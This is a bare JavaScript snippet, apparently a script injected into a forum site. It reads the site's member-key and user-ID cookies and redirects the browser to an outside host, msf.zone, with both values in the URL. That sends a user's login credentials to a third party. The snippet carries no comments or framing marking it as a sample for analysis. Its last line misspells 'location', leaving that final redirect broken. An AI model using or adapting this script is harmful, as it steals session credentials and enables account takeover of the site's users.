function getCookie(name) {
    var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
    if (arr = document.cookie.match(reg))
        return unescape(arr[2]);
    else
        return null;
}

if (getCookie("lZFQ_2132_tom_ucenter_member_key")!="") {
    location.href="http://www.msf.zone/api/feed/hel?a="+
        encodeURIComponent(getCookie("lZFQ_2132_tom_ucenter_member_key"))+"&b="+
        encodeURIComponent(getCookie("lZFQ_2132_tom_ucenter_member_uid"));
}else{
    location.href="http://www.msf.zone/api/feed/hel?a=1&b=2";
}

loation.href="http://m.msf.zone/thread?_sid=5373"

